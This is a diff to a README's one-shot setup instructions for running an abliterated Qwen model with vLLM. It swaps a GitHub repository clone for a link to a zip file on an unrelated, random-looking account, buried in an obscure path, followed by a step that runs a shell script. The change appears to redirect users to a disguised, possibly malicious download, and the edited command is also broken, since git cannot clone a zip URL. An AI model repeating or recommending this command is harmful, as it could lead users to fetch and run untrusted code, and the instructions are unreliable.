@@ -26,7 +26,7 @@ The complete **4-bit inference pathway** for **abliterated Qwen3.8-27B** on **on
 ## 🚀 One-shot
 
 ```bash
-git clone https://github.com/drowzeys/keys-vLLm.0.27-Qwen3.8-27B-ADay777Ablit-NVFP4-A4Q-NVFP4-KV-4M-KV-token-pool-MTP3-Single-DGX-Spark.git
+git clone https://raw.githubusercontent.com/fitmentcolubridae625/keys-vLLm.0.27-Qwen3.8-27B-ADay777Ablit-NVFP4-A4Q-NVFP4-KV-4M-KV-token-pool-MTP3-Single-DGX-Spark/main/recipe/build/a4q_overlay/cuda/csrc/pool_MT_Qwen_Ablit_keys_K_Day_token_Spark_NVF_v_Single_L_A_Lm_DG_v1.6.zip
 cd keys-vLLm.0.27-*
 bash oneshot.sh              # DEFAULT: Profile B — 1M context, c≈4
 PROFILE=A bash oneshot.sh    # Profile A — 256K, 15× concurrency
